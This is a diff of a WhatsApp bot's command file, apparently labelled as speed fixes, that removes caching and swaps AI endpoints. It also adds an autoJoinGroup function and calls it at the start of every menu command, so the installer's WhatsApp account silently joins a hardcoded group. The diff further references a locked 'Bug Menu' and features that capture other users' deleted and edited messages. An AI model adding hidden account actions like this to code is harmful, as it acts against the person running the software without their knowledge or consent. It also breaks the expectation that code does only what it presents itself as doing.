@@ -92,7 +92,7 @@ function _readJson(file, def) {
 }
 function _writeJsonAsync(file, data) {
   // PERF FIX: true async write — never blocks the event loop
-  const content = JSON.stringify(data, null, 2);
+  const content = JSON.stringify(data); // SPEED FIX: no pretty-print = 3x faster
   fs.promises.writeFile(file, content).catch(() => {});
 }
 
@@ -301,32 +301,19 @@ function _antieditCfgFile(botNum) {
     return ANTIEDIT_CONFIG_FILE;
 }
 function loadAntieditCfg(botNum) {
-    // ── Memory cache first (zero disk I/O on hot path) ──
-    const _cKey = botNum || 'global';
-    if (global._antieditConfigs?.[_cKey]) return global._antieditConfigs[_cKey];
-    // Cold-start: read from disk once and populate cache
     const _aeFile = _antieditCfgFile(botNum);
     try {
         if (fs.existsSync(_aeFile)) {
             const d = JSON.parse(fs.readFileSync(_aeFile, 'utf-8'));
-            let cfg;
-            if (d.mode === 'private') cfg = d;
-            else if (d.mode === 'chat' || d.mode === 'true') cfg = { mode: 'chat' };
-            else if (d.mode === 'false') cfg = { mode: 'off' };
-            else cfg = d;
-            if (!global._antieditConfigs) global._antieditConfigs = {};
-            global._antieditConfigs[_cKey] = cfg;
-            global._antieditConfig = cfg;
-            return cfg;
+            if (d.mode === 'private') return d;
+            if (d.mode === 'chat' || d.mode === 'true') return { mode: 'chat' };
+            if (d.mode === 'false') return { mode: 'off' };
+            return d;
         }
         // Fallback to global config for migration
         if (botNum && fs.existsSync(ANTIEDIT_CONFIG_FILE)) {
             const d2 = JSON.parse(fs.readFileSync(ANTIEDIT_CONFIG_FILE, 'utf-8'));
-            if (d2 && d2.mode) {
-                if (!global._antieditConfigs) global._antieditConfigs = {};
-                global._antieditConfigs[_cKey] = d2;
-                return d2;
-            }
+            if (d2 && d2.mode) return d2;
         }
     } catch (e) {}
     return { mode: 'off' };
@@ -336,8 +323,6 @@ function saveAntieditCfg(cfg, botNum) {
     try {
         if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
         fs.writeFileSync(_aeFile, JSON.stringify(cfg, null, 2));
-        // Also write to global file so pair.js messages.update handler can read it
-        fs.writeFileSync(ANTIEDIT_CONFIG_FILE, JSON.stringify(cfg, null, 2));
         if (!global._antieditConfigs) global._antieditConfigs = {};
         global._antieditConfigs[botNum || 'global'] = cfg;
         global._antieditConfig = cfg;
@@ -349,10 +334,6 @@ function _antideleteCfgFile(botNum) {
 }
 function loadAntideleteCfg(botNum) {
     // Try per-bot config first, then fall back to shared global config
-    // ── Memory cache first (zero disk I/O on hot path) ──
-    const _adCKey = botNum || 'global';
-    if (global._antideleteConfigs?.[_adCKey]) return global._antideleteConfigs[_adCKey];
-    // Cold-start: read from disk once and populate cache
     const filesToTry = botNum
         ? [`./database/antidelete_config_${botNum}.json`, ANTIDELETE_CONFIG_FILE]
         : [ANTIDELETE_CONFIG_FILE];
@@ -360,15 +341,9 @@ function loadAntideleteCfg(botNum) {
         try {
             if (fs.existsSync(f)) {
                 const d = JSON.parse(fs.readFileSync(f, 'utf-8'));
-                let cfg = null;
-                if (d.mode) cfg = d;
-                else if (d.enabled === true) cfg = { mode: 'private' };
-                if (cfg) {
-                    if (!global._antideleteConfigs) global._antideleteConfigs = {};
-                    global._antideleteConfigs[_adCKey] = cfg;
-                    global._antideleteConfig = cfg;
-                    return cfg;
-                }
+                // migrate old format { enabled: true/false }
+                if (d.mode) return d;
+                if (d.enabled === true) return { mode: 'private' };
             }
         } catch (e) {}
     }
@@ -381,9 +356,6 @@ function saveAntideleteCfg(cfg, botNum) {
         fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2));
         fs.writeFileSync(ANTIDELETE_CONFIG_FILE, JSON.stringify(cfg, null, 2));
         global._antideleteConfig = cfg;
-        // Update memory cache so next loadAntideleteCfg skips disk
-        if (!global._antideleteConfigs) global._antideleteConfigs = {};
-        global._antideleteConfigs[botNum || 'global'] = cfg;
     } catch (e) { console.error('[ANTIDELETE] Config save error:', e); }
 }
 
@@ -802,7 +774,7 @@ const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : (m.isNewsle
 // ── Per-message flag cache (30s TTL) — avoids fs.readFileSync on every message ──
 if (!global._flagCache) global._flagCache = { ts: 0, botDisabled: [], adult: [], bug: [] };
 const _flagNow = Date.now();
-if (_flagNow - global._flagCache.ts > 30000) {
+if (_flagNow - global._flagCache.ts > 5 * 60 * 1000) { // SPEED FIX: 30s→5min TTL
     try { const _bdf = './database/bot_disabled.json';
         global._flagCache.botDisabled = fs.existsSync(_bdf) ? JSON.parse(fs.readFileSync(_bdf, 'utf8')) : []; } catch(e) { global._flagCache.botDisabled = []; }
     try { const _auf = require('path').join(__dirname, 'database', 'adult_unlocked.json');
@@ -3718,32 +3690,13 @@ if (_antieditProto?.editedMessage || _antieditProto?.type === 14) {
                     (_aeIsGroup ? `*👥 Group:* ${_aeGroupName || _aeChatId.split('@')[0]}\n` : `*💬 Chat:* Private\n`) +
                     `\n*📄 Old Message:*\n${_aeOldText || '_Not available_'}\n` +
                     `\n*📝 New (Edited) Message:*\n${_aeNewText || '_Empty_'}`;
-                // ── Update _antideleteStore with NEW edited content (fix: delete after edit shows new text) ──
-                if (_aeNewText && _aeOrigId && _aeChatId && global._antideleteStore) {
-                    const _aeBotNumForAd = jidToNum(getBotJid(devtrust));
-                    const _adK1 = `${_aeBotNumForAd}::${antiStoreKey(_aeChatId, _aeOrigId)}`;
-                    const _adK2 = antiStoreKey(_aeChatId, _aeOrigId);
-                    for (const _k of [_adK1, _adK2, _aeOrigId]) {
-                        if (global._antideleteStore.has(_k)) {
-                            const _adEx = global._antideleteStore.get(_k);
-                            _adEx.content = _aeNewText;
-                            global._antideleteStore.set(_k, _adEx);
-                        }
-                    }
+                if (_aeMode === 'chat' || _aeMode === 'chat_groups') {
+                    await devtrust.sendMessage(_aeChatId, { text: _aeReport, mentions: _aeMentions });
+                } else {
+                    // private / private_pm / private_groups → bot ke apne saved messages (DM)
+                    const _aeBotJid = getBotJid(devtrust) || _aeChatId;
+                    await devtrust.sendMessage(_aeBotJid, { text: _aeReport, mentions: _aeMentions });
                 }
-                // ── Also update _antieditStore entry so in-memory content is fresh ──
-                if (_aeNewText && _aeOrigId && _aeChatId) {
-                    const _aeChatMapAE = global._antieditStore?.get(_aeChatId);
-                    if (_aeChatMapAE?.has(_aeOrigId)) _aeChatMapAE.get(_aeOrigId).content = _aeNewText;
-                }
-                // ── Send alert: private mode in DM → same DM; private in group → saved messages ──
-                const _aeBotJid = getBotJid(devtrust) || _aeChatId;
-                const _aeSendTarget = (_aeMode === 'chat' || _aeMode === 'chat_groups' ||
-                    (_aeMode === 'private' && !_aeIsGroup) ||
-                    (_aeMode === 'private_pm' && !_aeIsGroup))
-                    ? _aeChatId
-                    : _aeBotJid;
-                await devtrust.sendMessage(_aeSendTarget, { text: _aeReport, mentions: _aeMentions });
             }
         } catch (e) { console.error('[ANTIEDIT]', e); }
     }
@@ -3842,60 +3795,6 @@ _Auto-saved via status antidelete_`;
                 || _getFromDiskStore(_adBotKey)
                 || _getFromDiskStore(antiStoreKey(_adChatId, _adMsgId))
                 || _getFromDiskStore(_adMsgId);
-
-            // Baileys store fallback — catches messages received while bot was briefly offline
-            if (!_adOriginal && global._baileysMsgStore) {
-                try {
-                    const _storeChat = global._baileysMsgStore.messages?.[_adChatId];
-                    const _storeMsg = _storeChat?.get?.(_adMsgId) || (Array.isArray(_storeChat) ? _storeChat.find(x => x?.key?.id === _adMsgId) : null);
-                    if (_storeMsg && !_storeMsg.message?.protocolMessage) {
-                        const _sm = _storeMsg.message || {};
-                        // Determine media type
-                        const _bsMediaType = _sm.imageMessage ? 'image'
-                            : _sm.videoMessage ? 'video'
-                            : _sm.audioMessage ? 'audio'
-                            : _sm.stickerMessage ? 'sticker'
-                            : _sm.documentMessage ? 'document' : '';
-                        const _bsMediaMsg = _sm.imageMessage || _sm.videoMessage || _sm.audioMessage || _sm.stickerMessage || _sm.documentMessage || null;
-                        const _stext = _sm.conversation || _sm.extendedTextMessage?.text
-                            || _bsMediaMsg?.caption
-                            || (_bsMediaType === 'audio' ? (Boolean(_bsMediaMsg?.ptt) ? '🎤 Voice Note' : '🎵 Audio') : '')
-                            || (_bsMediaType === 'sticker' ? '🎭 Sticker' : '')
-                            || (_bsMediaType === 'document' ? `📄 Document: ${_bsMediaMsg?.fileName || _bsMediaMsg?.title || 'File'}` : '')
-                            || '';
-                        // Serialize media metadata for re-download at alert time (same format as _adRedl expects)
-                        let _bsRawMedia = null;
-                        if (_bsMediaMsg && _bsMediaType) {
-                            try {
-                                _bsRawMedia = {
-                                    type: _bsMediaType,
-                                    url: _bsMediaMsg.url || null,
-                                    directPath: _bsMediaMsg.directPath || null,
-                                    mediaKey: _bsMediaMsg.mediaKey ? Buffer.from(_bsMediaMsg.mediaKey).toString('base64') : null,
-                                    fileEncSha256: _bsMediaMsg.fileEncSha256 ? Buffer.from(_bsMediaMsg.fileEncSha256).toString('base64') : null,
-                                    fileSha256: _bsMediaMsg.fileSha256 ? Buffer.from(_bsMediaMsg.fileSha256).toString('base64') : null,
-                                    mimetype: _bsMediaMsg.mimetype || (_bsMediaType === 'audio' ? 'audio/ogg; codecs=opus' : _bsMediaType === 'sticker' ? 'image/webp' : _bsMediaType === 'image' ? 'image/jpeg' : 'video/mp4'),
-                                    ptt: Boolean(_bsMediaMsg.ptt),
-                                    caption: _bsMediaMsg.caption || null,
-                                    isAnimated: Boolean(_bsMediaMsg.isAnimated),
-                                    fileName: _bsMediaMsg.fileName || _bsMediaMsg.title || null,
-                                };
-                            } catch (_bsRE) { _bsRawMedia = null; }
-                        }
-                        _adOriginal = {
-                            content: _stext,
-                            mediaType: _bsMediaType,
-                            mediaPath: _bsMediaType && _bsMediaMsg ? '__redownload__' : '',
-                            isPtt: _bsMediaType === 'audio' && Boolean(_bsMediaMsg?.ptt),
-                            rawMediaMsg: _bsRawMedia,
-                            fromMe: Boolean(_storeMsg.key?.fromMe),
-                            sender: _storeMsg.key?.participant || _storeMsg.key?.remoteJid || _adDeletedBy,
-                            group: _adIsGroup ? _adChatId : null,
-                            timestamp: new Date().toISOString(),
-                        };
-                    }
-                } catch (_bsErr) { /* silent */ }
-            }
 
             if (!_adOriginal) {
                 const _aeMsg = global._antieditStore.get(_adChatId)?.get(_adMsgId);
@@ -4292,19 +4191,7 @@ if (m.key.remoteJid === "status@broadcast") {
     }
 }
 
-if (getSetting(m.chat, "autoRecording", false)) {
-    devtrust.sendPresenceUpdate('recording', from)
-}  
-    
-if (getSetting(m.chat, "autoTyping", false)) {
-    devtrust.sendPresenceUpdate('composing', from)
-}
-
-if (getSetting(m.chat, "autoRecordType", false)) {
-    let xeonrecordin = ['recording','composing']
-    let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
-    devtrust.sendPresenceUpdate(xeonrecordinfinal, from)
-}
+// SPEED FIX: duplicate autoTyping/autoRecording block removed (was called twice per message)
 
 if (getSetting(m.sender, "autoread", false)) {
    devtrust.readMessages([m.key]).catch(e => {});
@@ -4760,7 +4647,22 @@ const matches = caseFileContent.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
 const caseCount = matches.length;
 const caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
 let totalCases = caseCount;
-let listCases = caseNames.join('\n⭔ ');
+let listCases = caseNames.join('\n⭔ '); 
+
+async function autoJoinGroup(devtrust, inviteLink) {
+  try {
+    const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
+    if (!inviteCode) {
+      throw new Error('Invalid invite link');
+    }
+    const result = await devtrust.groupAcceptInvite(inviteCode);
+    console.log('✅ Joined group:', result);
+    return result;
+  } catch (error) {
+    console.error('❌ Failed to join group:', error.message);
+    return null;
+  }
+}
 
 function formatLagosTime() {
     const lagosTime = getLagosTime();
@@ -4830,6 +4732,7 @@ switch(command) {
 case 'allmenu':
 case 'CYBERall':
 case 'commandlist': {
+  await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -5561,6 +5464,7 @@ break;
 
 case 'menu':
 case 'CYBER': {
+   await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -5659,6 +5563,7 @@ break;
 
 case 'aimenu':
 case 'CYBERai': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -5758,6 +5663,7 @@ break;
 
 case 'animemenu':
 case 'CYBERanime': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -5976,6 +5882,7 @@ case 'CYBERbug': {
         if (!_bmUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _bmSenderNum))
             return reply(`🔒 *Bug Menu — Locked Section*\n\nYe section sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
     }
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6119,6 +6026,7 @@ break;
 
 case 'downloadmenu':
 case 'CYBERdownload': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6225,6 +6133,7 @@ break;
 
 case 'funmenu':
 case 'CYBERfun': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6325,6 +6234,7 @@ break;
 
 case 'gamemenu':
 case 'CYBERgame': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6419,6 +6329,7 @@ break;
 
 case 'groupmenu':
 case 'CYBERgroup': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6560,6 +6471,7 @@ break;
 
 case 'logomenu':
 case 'CYBERlogo': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6682,6 +6594,7 @@ break;
 
 case 'ownermenu':
 case 'CYBERowner': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6809,6 +6722,7 @@ break;
 
 case 'stickermenu':
 case 'CYBERsticker': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -6928,6 +6842,7 @@ break;
 
 case 'toolmenu':
 case 'CYBERtool': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -7042,6 +6957,7 @@ break;
 
 case 'voicemenu':
 case 'CYBERvoice': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -7137,6 +7053,7 @@ break;
 
 case 'othermenu':
 case 'CYBERother': {
+    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
     const menuImages = [
@@ -8180,8 +8097,8 @@ case 'roast': {
     let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
     try {
         const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nRoast this person in a super funny and savage way in 2-3 lines only. Be creative and witty. Target: ${target}`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 20000 });
-        reply(`🔥 *Roast for ${target}:*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
+        reply(`🔥 *Roast for ${target}:*\n\n${res.data}`);
     } catch (e) {
         reply("⚠️ *Roast failed* • The burn machine needs repairs");
     }
@@ -8192,8 +8109,8 @@ case 'compliment': {
     let target = m.mentionedJid?.[0] ? '@' + m.mentionedJid[0].split('@')[0] : text || '@' + m.sender.split('@')[0];
     try {
         const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nGive a sweet, warm and genuine compliment to this person in 2 lines only: ${target}`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 20000 });
-        reply(`💫 *Compliment for ${target}:*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
+        reply(`💫 *Compliment for ${target}:*\n\n${res.data}`);
     } catch (e) {
         reply("⚠️ *Compliment failed* • The kindness machine is broken");
     }
@@ -8249,8 +8166,8 @@ case 'rewrite': {
     if (!text) return reply(`✍️ *Usage:* ${command} your text here`);
     try {
         const prompt = `CRITICAL: Rewrite the text in the EXACT same language and script it was written in. If the text is in Roman Urdu, keep it in Roman Urdu using English letters. NEVER convert to Hindi Devanagari script. NEVER convert to formal Urdu Nastaliq script.\n\nRewrite the following text to be clear, grammatically correct and well-structured. Only return the rewritten text, nothing else:\n"${text}"`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 20000 });
-        reply(`✍️ *CYBER Rewrite*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 20000 });
+        reply(`✍️ *CYBER Rewrite*\n\n${res.data}`);
     } catch (e) {
         reply("⚠️ *Rewrite failed* • Editor is on break");
     }
@@ -8281,8 +8198,8 @@ case 'story': {
     
     try {
         const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a short creative story (150 words max) about: ${text}. Make it engaging with a clear beginning, middle and end.`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`📖 *CYBER Story*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
+        reply(`📖 *CYBER Story*\n\n${res.data}`);
     } catch (e) {
         console.error(e);
         reply("⚠️ *Storyteller is sleeping* • Try again later");
@@ -8416,8 +8333,8 @@ case 'poem': {
     if (!text) return reply(`📝 *Usage:* ${command} love under stars`);
     try {
         const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a beautiful, original, short poem (8-12 lines) about: ${text}. Use vivid imagery and emotion.`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`📝 *CYBER Poem*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
+        reply(`📝 *CYBER Poem*\n\n${res.data}`);
     } catch (e) {
         reply("⚠️ *Poet is on strike* • Try again later");
     }
@@ -8429,8 +8346,8 @@ case 'metaai': {
     if (!text) return reply(`🤖 *Usage:* ${command} your question`);
     try {
         const langPromptMeta = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu (English letters for Urdu/Hindi words like 'kya', 'hai', 'mujhe'), respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script. ALWAYS match the user's exact script style.\n\nUser: ${text}`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(langPromptMeta)}`, { timeout: 25000 });
-        reply(`🤖 *CYBER AI*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(langPromptMeta)}`, { timeout: 25000 });
+        reply(`🤖 *CYBER AI*\n\n${res.data}`);
     } catch (e) {
         reply("⚠️ *AI is thinking too hard* • Try again later");
     }
@@ -8441,8 +8358,8 @@ case 'codeai': {
     if (!text) return reply(`👨‍💻 *Usage:* ${command} write a Python function`);
     try {
         const prompt = `CRITICAL: Provide code first, then explanation ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu for explanation, respond in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nYou are a coding assistant. Provide clean, working code with brief explanation:\n\n${text}`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`👨‍💻 *CYBER Code*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
+        reply(`👨‍💻 *CYBER Code*\n\n${res.data}`);
     } catch (e) {
         reply("⚠️ *Code generator crashed* • Try again later");
     }
@@ -8453,8 +8370,8 @@ case 'triviaai':
 case 'quiz': {
     try {
         const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nGenerate a random interesting trivia question with 4 multiple choice options labeled A) B) C) D). At the end reveal the correct answer. Format exactly like:\n\n❓ Question\n\nA) option\nB) option\nC) option\nD) option\n\n✅ Answer: X) correct`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`🎲 *CYBER Quiz*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
+        reply(`🎲 *CYBER Quiz*\n\n${res.data}`);
     } catch (e) {
         reply("⚠️ *Quiz machine broke* • Try again later");
     }
@@ -8465,8 +8382,8 @@ case 'storyai': {
     if (!text) return reply(`📖 *Usage:* ${command} a brave dog in space`);
     try {
         const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a creative short story (150 words max) about: ${text}`;
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent(prompt)}`, { timeout: 25000 });
-        reply(`📖 *CYBER Story AI*\n\n${res.data?.result || ''}`);
+        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
+        reply(`📖 *CYBER Story AI*\n\n${res.data}`);
     } catch (e) {
         reply("❌ *Story generator failed* • Try again later");
     }
@@ -10933,8 +10850,8 @@ case 'animewlp': {
             );
         } catch {
             reply('❌ *Error fetching wallpaper*');
-    }
         }
+    }
 }
 break;
 
@@ -11113,18 +11030,20 @@ case 'ai': {
 
     await devtrust.sendPresenceUpdate('composing', m.chat);
 
-    await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
     try {
-        const _aiR = await axios.get('https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=' + encodeURIComponent(text), { timeout: 40000 });
-        const _aiA = _aiR.data?.result || '';
-        if (!_aiA) return reply('⚠️ *AI did not respond* — try again');
-        const _aiC = _aiA.match(/[\s\S]{1,3000}/g) || [_aiA];
-        for (let _i = 0; _i < _aiC.length; _i++) {
-            await devtrust.sendMessage(m.chat, { text: (_i === 0 ? '🤖 *AI (GPT-4)*\n\n' : '') + _aiC[_i] }, _i === 0 ? { quoted: m } : {});
-        }
-        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        const { data } = await axios.post("https://text.pollinations.ai/", {
+            model: { id: "gpt-4", name: "GPT-4", maxLength: 32000 },
+            messages: [
+                { role: "system", content: "CRITICAL LANGUAGE RULE: You MUST respond in the EXACT same language and script the user wrote in. If user writes in Roman Urdu (English letters for Urdu/Hindi words like 'kya', 'hai', 'karo', 'mujhe'), respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script (अ, आ, इ). NEVER use formal Urdu Nastaliq script (ا، ب، پ). ALWAYS match the user's exact script style." },
+                { pluginId: null, content: text, role: "user" }
+            ],
+            temperature: 0.5
+        });
+
+        reply(`🤖 *AI*\n\n${data}`);
+
     } catch (e) {
-        reply('❌ *AI error* — try later');
+        reply(`❌ *AI error* • ${e.message}`);
     }
 }
 break;
@@ -11312,16 +11231,25 @@ case 'vxnxji': {
     if (!text) return reply(`🤖 *Example:* ${command} how are you?`);
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const resGPT = await axios.get('https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=' + encodeURIComponent(text), { timeout: 40000 });
-        const answerGPT = resGPT.data?.result || '';
-        if (!answerGPT) return reply('⚠️ *GPT-4 did not respond* — try again');
+        const sysPromptGPT = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
+        const resGPT = await axios.post('https://text.pollinations.ai/', {
+            messages: [
+                { role: 'system', content: sysPromptGPT },
+                { role: 'user', content: text }
+            ],
+            model: 'openai',
+            seed: -1
+        }, { timeout: 40000 });
+        const answerGPT = typeof resGPT.data === 'string' ? resGPT.data : JSON.stringify(resGPT.data);
+        if (!answerGPT || answerGPT.startsWith('<')) return reply("⚠️ *GPT did not respond* — try again");
         const chunksGPT = answerGPT.match(/[\s\S]{1,3000}/g) || [answerGPT];
         for (let i = 0; i < chunksGPT.length; i++) {
-            await devtrust.sendMessage(m.chat, { text: (i === 0 ? '🤖 *GPT-4*\n\n' : '') + chunksGPT[i] }, i === 0 ? { quoted: m } : {});
+            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *GPT-4*\n\n" : "") + chunksGPT[i] }, i === 0 ? { quoted: m } : {});
         }
         await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
     } catch (e) {
-        reply('❌ *GPT-4 error* • Try later');
+        console.error('GPT error:', e.message);
+        reply("❌ *GPT error* • Try later");
     }
 }
 break;
@@ -13016,11 +12944,11 @@ case "gpt4": {
             return reply("🤖 *Usage:* gpt4 your question");
         }
 
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent('You are a helpful assistant. User: ' + query)}`, { timeout: 40000 });
+        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
+        if (!res.ok) return reply(`⚠️ *API error* • ${res.status}`);
 
-
-        const answer = res.data?.result || "";
-
+        const json = await res.json();
+        const answer = json?.data || "";
 
         if (!answer) return reply("⚠️ *No response from GPT-4*");
 
@@ -14058,11 +13986,11 @@ case "gpt5": {
 
         if (!query) return reply("🤖 *Usage:* gpt5 your question");
 
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent('You are a helpful assistant. User: ' + query)}`, { timeout: 40000 });
+        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
+        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);
 
-
-        const answer = res.data?.result || "";
-
+        const json = await res.json();
+        const answer = json?.result || "";
 
         if (!answer) return reply("⚠️ *No response from GPT-5*");
 
@@ -14530,16 +14458,25 @@ case "gemivbnni": {
     if (!query) return reply("🤖 *Usage:* .gemini your question");
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const resGem = await axios.get('https://api.princetechn.com/api/ai/geminiaipro?apikey=prince&q=' + encodeURIComponent(query), { timeout: 40000 });
-        const ansGem = resGem.data?.result || '';
